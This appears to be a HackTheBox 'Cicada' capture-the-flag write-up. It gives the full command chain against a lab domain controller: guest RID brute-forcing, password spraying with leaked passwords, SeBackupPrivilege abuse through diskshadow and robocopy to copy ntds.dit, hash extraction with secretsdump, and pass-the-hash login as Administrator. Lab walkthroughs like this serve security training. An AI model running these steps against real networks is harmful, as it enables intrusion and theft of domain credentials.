---
title: Cicada
description: 'Ldap search for users and smb enum. User has SeBackupPrivilege and SeRestorePrivilege to backup the ntds.dit and system hive'
pubDate: 2024-10-16
category: 'hackthebox'
tags: ['ldapsearch', 'rid-brute', 'clock skew', 'secretsdump']
image: 'https://labs.hackthebox.com/storage/avatars/79616a32a057e5e672dadb51bb96dd04.png'
---

Basic LDAP enum

```bash
ldapsearch -x -H ldap://cicada.htb -s base namingcontexts
...[snip]...
namingcontexts: DC=cicada,DC=htb
...[snip]...
```
```bash
ldapsearch -H ldap://cicada.htb/ -x -s base -b '' "(objectClass=*)" "*" +
...[snip]...
dnsHostName: CICADA-DC.cicada.htb
...[snip]...
```

We can enumerate users by giving a valid user without a pass

```bash
netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
...[snip]...
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

We can list shares with the 'guest' user without a pass:

```bash
netexec smb 10.10.11.35 -u 'guest' -p '' --shares
...[snip]...
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share
```

On the HR drive we find a text file:

```bash
smbclient //cicada.htb/HR
Password for [WORKGROUP\ex-it]:
...[snip]...
smb: \> dir
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
...[snip]...
smb: \> get "Notice from HR.txt"
```

It contains a password for new users: `Cicada$M6Corpb*@Lp#nZp!8`
The user 'michael.wrightson' seem to use this password:

```bash
netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
SMB         10.10.11.35     445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.10.11.35     445    CICADA-DC        C$                              Default share
SMB         10.10.11.35     445    CICADA-DC        DEV
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.10.11.35     445    CICADA-DC        NETLOGON        READ            Logon server share
SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ            Logon server share
```

We don't have any other shares to look at with this user/pass combination, but we can get more data with enum4linux-ng since we have valid credentials.

```bash
enum4linux-ng cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -A
NUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... cicada.htb
[*] Username ......... 'michael.wrightson'
[*] Random Username .. 'buxrmfwv'
[*] Password ......... 'Cicada$M6Corpb*@Lp#nZp!8'
[*] Timeout .......... 5 second(s)
...[snip]...
'1108':
  username: david.orelious
  name: (null)
  acb: '0x00000210'
  description: Just in case I forget my password is aRt$Lp#7t*VQ!3
...[snip]...
```

This user has access to the DEV share:

```bash
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
...[snip]...
SMB         10.10.11.35     445    CICADA-DC        DEV             READ
SMB         10.10.11.35     445    CICADA-DC        HR              READ
SMB         10.10.11.35     445    CICADA-DC        IPC$            READ            Remote IPC
...[snip]...
```

On the DEV share there is a script called `Backup_script.ps1`.

```bash
smbclient //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
Try "help" to get a list of possible commands.
smb: \> dir
...[snip]...
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024
```

## USER

This script has the password for the user 'emily.oscars':

```powershell
...[snip]...
$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
...[snip]...
```

This user has READ and WRITE access to C$:

```bash
netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
...[snip]...
SMB         10.10.11.35     445    CICADA-DC        C$              READ,WRITE      Default share
...[snip]...
```

and can remote login:

```bash
netexec winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

Logging in:

```bash
evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

## ROOT

Once we have remote access as user 'emily.oscars' we see we have backup and restore privileges.

```bash
*Evil-WinRM* PS C:\> whoami /all
...[snip]...
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
...[snip]...
```

We need to set a few things in order to create a backup.
So we upload `raj.dsh` to the machine:

```bash
cat raj.dsh
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

The file should be in 'dos' format:

```bash
unix2dos raj.dsh
```

On the target:
```bash
*Evil-WinRM* PS C:\temp\Temp> upload raj.dsh
*Evil-WinRM* PS C:\temp\Temp> diskshadow /s raj.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  CICADA-DC,  10/16/2024 3:44:26 PM
...[snip]...
```

Copy the `ntds.dit` file:
```bash
*Evil-WinRM* PS C:\temp\Temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Wednesday, October 16, 2024 3:44:38 PM
   Source : z:\windows\ntds\
     Dest : C:\temp\Temp\

    Files : ntds.dit
...[snip]...
```

Copy of `hklm\system`:
```bash
reg save hklm\system c:\temp\Temp\system
```

Now we can download both files to our machine:
```bash
*Evil-WinRM* PS C:\temp\Temp> download ntds.dit
Info: Downloading C:\temp\Temp\ntds.dit to ntds.dit

Info: Download successful!

*Evil-WinRM* PS C:\temp\Temp> download system

Info: Downloading C:\temp\Temp\system to system

Info: Download successful!
```

On our machine we can dump the hashes:

```bash
impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f954f575c626d6afe06c2b80cc2185e6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
...[snip]...
```

And we can login with the Administrators hash:

```bash
evil-winrm -i cicada.htb -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```


## ADDITIONAL STUFF

Getting the TGT and fixing the clock skew:

```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.10.11.35
Wed Oct 16 23:37:37 CEST 2024

impacket-getTGT cicada.htb/michael.wrightson:'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip 10.10.11.35
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in michael.wrightson.ccache

sudo timedatectl set-ntp on
```

```bash
certipy-ad find -k -no-pass -ns 10.10.11.35 -debug -dc-ip CICADA-DC.cicada.htb
```

